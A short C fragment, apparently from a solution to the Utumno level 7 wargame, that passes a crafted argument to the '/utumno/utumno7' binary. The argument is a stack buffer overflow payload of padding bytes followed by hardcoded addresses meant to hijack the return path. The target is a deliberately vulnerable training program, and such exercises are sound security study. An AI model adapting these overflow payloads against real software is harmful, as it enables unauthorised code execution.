...
int main(void) {
	...
	char *argv[3] = {"/utumno/utumno7", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xba\xdf\xff\xff""AAAAAAAAAAAAAAAABBBBBBBBCCCC\x01\x83\x04\x08\xd0\xdc\xff\xff", 0};
